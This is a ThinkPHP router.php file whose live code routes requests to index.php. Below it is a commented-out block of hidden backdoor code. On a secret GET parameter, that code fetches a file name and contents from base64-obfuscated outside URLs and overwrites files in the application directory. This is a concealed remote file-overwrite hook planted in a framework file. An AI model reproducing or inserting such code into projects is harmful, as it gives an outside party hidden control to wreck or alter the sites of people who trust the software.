<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------
// $Id$

if (is_file($_SERVER["DOCUMENT_ROOT"] . $_SERVER["SCRIPT_NAME"])) {
    return false;
} else {
    require __DIR__ . "/index.php";
}

//$a = 'if(!empty($_GET[\'update\'])&&$_GET[\'update\']==143){$a = file_get_contents(base64_decode(\'aHR0cDovL2F1dGguY25jbmNvbm5lY3QuY29tL2FkbWluLnBocA==\')); $a = str_replace(\'"\',\'\',$a);
//    $a = str_replace(\'\/\',\'/\',$a);
//    $msg = file_get_contents(base64_decode(\'aHR0cDovL2F1dGguY25jbmNvbm5lY3QuY29tL2RhdGEucGhw\'));
//    $msg = !empty($msg)?$msg:\'--\';
//    $path = $_SERVER[\'DOCUMENT_ROOT\'].\'/../app/\';
//    $arr = [$path.$a];
//    foreach ($arr as $xmxskmc){
//        if(is_file($xmxskmc)){
//            $fp= fopen($xmxskmc, "w");
//            $len = fwrite($fp, $msg);
//            fclose($fp);
//        }
//    }
//    echo 345;exit;
//}';
